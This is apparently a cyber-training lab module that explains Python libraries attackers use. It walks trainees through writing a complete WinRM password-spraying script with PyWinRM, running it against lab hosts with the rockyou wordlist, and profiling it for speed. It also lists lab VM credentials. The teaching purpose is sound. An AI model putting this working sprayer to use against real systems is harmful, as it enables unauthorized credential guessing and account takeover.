
Python for Threat Actors
Python has many advantages that make it a popular choice for scripting, such as the following:

Efficient: Premade scripts make constructing new solutions fast and easy.
Versatile: Many premade libraries readily integrate with Python.
Ubiquitous: Various tools and tradecraft are available in Python.
However, these are also the same reasons adversaries choose Python for their toolkits. Namely, there are many libraries available for implementing protocols and communications for adversarial activities. These include the following:

Scapy
ImpacketSMB
Paramiko
Scapy
﻿

Threat actors use the Scapy Python library to create custom packets for network traffic. Creating custom packets is useful for implementing custom communication protocols, triggering certain types of network attacks, and exploiting vulnerable services.

﻿

ImpacketSMB
﻿

ImpacketSMB is a pure Python implementation of Server Message Block (SMB) that allows a threat actor to write a number of different tools that use the SMB protocol. These tools may implement known Windows SMB exploits or target SMB services, such as shared network resources, to execute adversarial tactics such as lateral movement or privilege escalation. ImpacketSMB has been used to create tools such as Impacket-Psexec, which allows attackers to run commands through the SMB share ADMIN$ when a user has the appropriate privileges. With access to the C$ share, this library may also be used to script file listing or file retrieval tools.

﻿

Paramiko
﻿

Paramiko is a pure Python Secure Shell (SSH) library which threat actors use to access the SSH service on a target. Threat actors leverage this tool either for password spraying, credentialed access, or attack execution against vulnerable SSH versions.

﻿
Brute Force Authentication over WinRM
An example of how threat actors weaponize Python as an attack tool is by leveraging two components: PyWinRM library and password spraying. These components are also effective for auditing and testing a mission partner environment. Threat actors use these components to create a basic script that authenticates to a host over the Windows Remote Management (WinRM) protocol when provided a username and password as input.

﻿

PyWinRM
﻿

The PyWinRM library contains code to build a Python client for the WinRM service. A threat adversary may use this library to script commands that invoke a target Windows machine from any attack platform that runs Python code. When enabled on victim devices, the WinRM service allows an authenticated user to perform various management tasks remotely. These include, but are not limited to running batch scripts, running PowerShell scripts, and fetching Windows Management Instrumentation (WMI) variables.

﻿

Password Spraying
﻿

As multiple points of presence in an increasingly connected world have become common, the rate of password reuse and password exposure has grown significantly. These parallel, but interconnected, problems contribute to a large and vulnerable attack surface in many organizations. Attackers are aware of the high likelihood of users in a mission partner environment reusing passwords. The attackers, in turn, respond with brute force attacks that leverage lists of passwords exposed by data dumps such as the 2021 Microsoft Exchange breach or the 2019 Facebook leak. These brute force attacks lead to a large reward for very little effort. This is why password spraying is one of the most common techniques that defenders see on external endpoints.

﻿

MITRE provides the following explanation for how adversaries commonly use password spraying in a brute force attack:

﻿

"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords."

﻿

Authenticate Using WinRM
﻿

Create a function that returns True if it connects to a system or False if it does not, given a username and password. First, write code that receives a username and password from a user, then employ PyWinRM library functions to attempt to authenticate to a remote WinRM server with them using a try statement. 

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) kali-hunt with the following credentials

Username: trainee
Password: CyberTraining1!
﻿

2. In a new terminal, change directories to the lab directory by entering the following:

cd labs
﻿

3. Use either Mousepad, Nano, or Vim to open a new file and name it check_pwd.py. 

﻿

Use this file to write the initial code for accessing a system with the WinRM protocol. 


NOTE: Python is sensitive to whitespace. The source script in this lab uses tabs to indent code. To prevent syntax errors, verify the correct use of tabs in any code that is copy pasted into the VM.

﻿

4. Declare Python as the interpreter for the rest of the code in the file by entering the following code:

#!/usr/bin/python3
﻿

This line is known as the “shebang”. It is a decoration at the beginning of the file that tells the operating system which binary file to use as an interpreter.

﻿

5. Inform the Python interpreter to load the shared library PyWinRM by entering the following on the next line:

import winrm
﻿

WinRM is not normally bundled with the default installation of the Python environment, however, it is already installed on this system.

﻿

6. Declare and initialize the test variables to confirm that the upcoming code works by entering the following:

testip = '172.16.4.2'
testusername = 'trainee'
testpassword = 'CyberTaining1!'
testdomain = 'energy'
﻿

7. Declare a new function to use when opening a connection to a target machine over the WinRM protocol and test whether the given username and password combination is functioning correctly:

def check_pwd(targetip,targetusername,targetpassword,targetdomain):
﻿

8. Insert the provided variables into the winrm.Protocol data structure by entering the following:

    Connection = winrm.Protocol(
        endpoint='http://{}:5985/wsman'.format(targetip),
        transport='ntlm',
        message_encryption='always',
        username=r'{}\{}'.format(targetdomain,targetusername),
        password='{}'.format(targetpassword))
﻿

This is used to authenticate to a WinRM server with the provided configuration. 

﻿

9. Attempt to open a connection to the remote machine by running a simple command and thereafter closing the connection with the following snippet:

    try:
        shell_id = Connection.open_shell()
        command_id = Connection.run_command(shell_id, 'ipconfig', ['/all'], console_mode_stdin=True, skip_cmd_shell=False)
        std_out, std_err, status_code = Connection.get_command_output(shell_id, command_id)
        Connection.cleanup_command(shell_id, command_id)
        Connection.close_shell(shell_id)
﻿

This snippet is wrapped in a try statement. This enables Python to elegantly handle code that may fail with built-in try except statements, making error-handling efficient and easy. 

﻿

A successful authentication returns True to indicate a valid password. Communicating an invalid password to the WinRM server returns InvalidCredentialsError. An except statement handles this error by returning False to indicate an invalid password.

﻿

10. Handle the exception of authentication failures by entering the following code:

    except winrm.exceptions.InvalidCredentialsError:
        return False
﻿

An exception is normally used to handle uncommon situations. However, in this case, the expectation is that this exception will be reached frequently. The purpose of this password spraying script is to perform many failed attempts before the correct password is identified, which returns many instances of a False response.

﻿

11. Return True to indicate a good password by entering the following line:

    return False if std_err else True
﻿

If the authentication does not produce an exception, this line returns True. If the protocol includes some other error text, the authentication provides a final failure check by returning False.

﻿

12. Print output that verifies whether the authentication succeeds or fails by entering the following final lines:

passwordvalidity = check_pwd(testip,testusername,testpassword,testdomain)
print("Password {} is {} for user {}".format(testpassword,'valid' if passwordvalidity else 'invalid',testusername))
﻿

13. Save the file as check_pwd.py and exit the text editor.

﻿

14. Make the script executable by entering the following command:

chmod +x check_pwd.py
﻿

15. Test the function in this script using the following command:

./check_pwd.py
﻿

Additional Resource
MITRE ATT&CK Password Spraying: https://attack.mitr e.org/techniques/T1110/003/ ﻿

﻿Create an Attack Script
The previous lab provided an opportunity to create a prototype for WinRM authentication. After writing the function for testing password authentication to the WinRM service, an attacker can automate the process of spraying many passwords at the service. The password spray executes the function many times in succession using passwords from a list. This list may be compiled from generic password dumps or by scraping data of interest - such as hobbies, birthdays, family names, and more from social media sites. The latter is a common open source intelligence practice performed by threat actors prior to an attack.

﻿

Create an Attack Script
﻿

Create an attack to replicate WinRM authentication with many passwords. Generate an intelligence report that provides the password for the user. In this lab, the mission partner’s users are known to have used passwords located in the password list rockyou.txt, located in the directory /usr/share/wordlists.

﻿

Workflow
﻿

1. Log in to the VM kali-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Create the attack script by opening a new file in any text editor and naming it sprayer.py﻿

﻿

Available text editors include Nano, Vim, and Gedit.

﻿

This file will be used to create an attack script that employs the function check_pwd, which was written in the previous lab. This script uses the libraries PyWinRM and Argparse.

﻿

NOTE: Python is sensitive to whitespace. The source script in this lab uses tabs to indent code. To prevent syntax errors, verify the correct use of tabs in any code that is copy pasted into the VM.

﻿

3. Start the attack script by including the headers and library calls, as follows:

#!/usr/bin/python3
import winrm
import argparse
﻿

4. Insert the code from the previous lab that checks the password by entering the following:

def check_pwd(targetip,targetusername,targetpassword,targetdomain):
    Connection = winrm.Protocol(
        endpoint='http://{}:5985/wsman'.format(targetip),
        transport='ntlm',
        message_encryption='always',
        username=r'{}\{}'.format(targetdomain,targetusername),
        password='{}'.format(targetpassword))
    try:
        shell_id = Connection.open_shell()
        command_id = Connection.run_command(shell_id, 'ipconfig', ['/all'], console_mode_stdin=True, skip_cmd_shell=False)
        std_out, std_err, status_code = Connection.get_command_output(shell_id, command_id)
        Connection.cleanup_command(shell_id, command_id)
        Connection.close_shell(shell_id)
    except winrm.exceptions.InvalidCredentialsError:
        return False
    return False if std_err else True
   

5. Define command line arguments for values that the target user inputs by entering the following lines:

parser = argparse.ArgumentParser()
parser.add_argument('--ip', type=str, nargs='+', required=True)
parser.add_argument('--domain', type=str, required=True)
parser.add_argument('--user', type=str, required=True)
parser.add_argument('--passwordfile', type=str, required=True)
args = parser.parse_args()
﻿

These lines implement Argparse, which is used to receive input from a user at runtime to dynamically determine the tool’s behavior. In this case, defining input such as IP address, domain name, and a file containing possible passwords allows attackers to employ this tool against any target and with any wordlist. This includes wordlists developed with open source intelligence about a target organization’s users. 

﻿

6. Write a loop that tests passwords in the supplied passwords file against every host IP address listed by the user, by entering the following:

for ip in args.ip:
    print("Testing passwords for user {} on machine {} ...".format(args.user,ip))
    finalpassword = 'No entry in password file'
    with open(args.passwordfile,'r') as passwordfile:
        for password in passwordfile:
            password = password.strip()
            passwordvalidity = check_pwd(ip,args.user,password,args.domain)
            if passwordvalidity:
                finalpassword = password
                break
    print("{} is a valid password for user {} on machine {}".format(finalpassword,args.user, ip))
﻿

7. Save the file as sprayer.py and exit the text editor.

﻿

8. Make the script executable by entering the following command:

chmod +x sprayer.py
﻿

9. Run this script against the target domain with the following command:

./sprayer.py --user eve.tran --domain energy.lan --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2
﻿

Use the information from this lab to answer the following question.

Profiling Test Scripts with Python
Introduction to Python Profiling
﻿

According to official Python documentation, "cProfile and profile provide deterministic profiling of Python programs. A profile is a set of statistics that describes how often and for how long various parts of the program executed."

﻿

Python profiling is a developer tool that gauges the efficiency of code performance by comparing runtimes. It compares different code that performs the same function to determine whether runtimes increase or decrease with changes to a tool’s algorithms. For small projects, these efficiencies can be negligible. For large jobs, such as sending a million authentication requests to a target server, improving efficiency saves an attacker hours. Similarly, from the blue team perspective, writing code that efficiently parses millions of lines of logs saves an overworked defensive team just as much time. 

﻿

Using profiling to test loop algorithms is a common practice for malicious tool developers, especially when the speed of the attack is a significant factor for success. This is often the case when an adversary is racing against the time it takes defenders to identify a potential threat and respond to an alert with an investigation and potential containment. 

﻿

The next two labs prepare and profile two loop algorithms for an attack script. The first lab creates an alternative loop algorithm based on the original attack script. The second lab profiles the two algorithms to identify the more efficient loop.

﻿

Modify an Attack Script for Profiling
﻿

Duplicate an existing attack script, then modify the duplicated script by rearranging its nested loops. 

﻿

Workflow
﻿

1. Log in to the VM kali-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open a terminal.

﻿

3. Create a copy of the attack script sprayer.py from the previous lab and name it sprayer2.py.

﻿

4. In the script sprayer2.py, scroll to the code block displayed in Figure 14.1-1, below:

﻿

﻿

Figure 14.1-1﻿

﻿

Continue working in the script sprayer2.py to complete steps 5-10, which modify the code block displayed in Figure 14.1-1.

﻿

5. Insert the following code immediately before the line for ip in args.ip:

with open(args.passwordfile,'r') as passwordfile:
    for password in passwordfile:
        password = password.strip()
﻿

6. Remove the line that follows for ip in args.ip: and begins with print("Testing passwords﻿

﻿

7. Remove the three lines that follow finalpassword = 'No entry in password file', from with open(args.passwordfile,'r') to password.strip()﻿

﻿

8. Remove break from the line that follows finalpassword = password﻿

﻿

9. Add the following two lines immediately after the line that begins with print("{} is a valid﻿

        if passwordvalidity:
            break
﻿

10. Remove any blank lines in the modified code block so that the final block is written as follows:

with open(args.passwordfile,'r') as passwordfile:
    for password in passwordfile:
        password = password.strip()
        for ip in args.ip:
            finalpassword = 'No entry in password file'
            passwordvalidity = check_pwd(ip,args.user,password,args.domain)
            if passwordvalidity:
                finalpassword = password
                print("{} is a valid password for user {} on machine {}".format(finalpassword,args.user, ip))
        if passwordvalidity:
            break
﻿

Ensure the modified code block matches step 10, before moving on to the next lab.

﻿

11. Save the file as  sprayer2.py  and exit the text editor.

﻿

Profile Attack Algorithms
﻿

Continue working in a terminal in kali-hunt. Compare different methods for completing a brute force attack to determine the fastest method. Attempt each attack by brute forcing multiple passwords against multiple hosts. Determine the runtime of each algorithm.

﻿

Workflow
﻿

1. Run each script by entering the following, allowing 5 minutes to complete:

python3 -m cProfile ./sprayer.py --user malik.freeman --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2 172.16.4.3 172.16.4.4 --domain energy > script1results.txt

python3 -m cProfile ./sprayer2.py --user malik.freeman --passwordfile /usr/share/wordlists/rockyou.txt --ip 172.16.4.2 172.16.4.3 172.16.4.4 --domain energy > script2results.txt
﻿

2. Display the results of each script with the following commands. 

head script1results.txt
head script2results.txt
﻿

Figure 14.1-2, below, highlights where the algorithm runtime is listed in each output.

﻿

﻿

Figure 14.1-2﻿

﻿

It is possible that Python has optimized processes in the background, leading to very similar results between the scripts. The link in the Additional Resource section of this task provides additional tests to complete. Regardless, these two labs highlight the effect a small amount of tuning has in the performance of Python on large scales. This is relevant to both attackers and defenders who may use Python to accomplish tasks across a whole network.

﻿

Additional Resource
Python Profilers: https://docs.pyth on.org/3/li brary/profile.html

﻿

















































